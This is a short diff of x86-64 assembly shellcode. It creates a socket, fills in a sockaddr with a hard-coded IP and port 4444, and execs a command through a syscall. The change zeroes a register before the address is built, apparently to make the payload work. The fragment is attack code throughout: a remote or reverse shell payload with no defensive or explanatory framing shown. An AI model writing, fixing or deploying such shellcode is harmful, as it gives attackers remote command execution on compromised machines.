@@ -31,6 +31,7 @@ start:
 	mov r12, rax 				; Save the socket
 
 ;Sock_addr
+	xor r9, r9
 	mov r13, 0xFFFFFFFF5C110101 ; IP = FFFFFFFF, Port = 5C11(4444)
 	;mov r13, 0x0345450A5C110101 ; IP = FFFFFFFF, Port = 5C11(4444)
 	mov r9b, 0xFF				; The sock_addr_in is + FF from where we need it
@@ -86,4 +87,3 @@ exec:
     mov rdi, rsp 				; move the command from the stack to rdi
     xor rsi, rsi 				; zero out rsi
     syscall						; call exec(rdi, 0, 0)
-
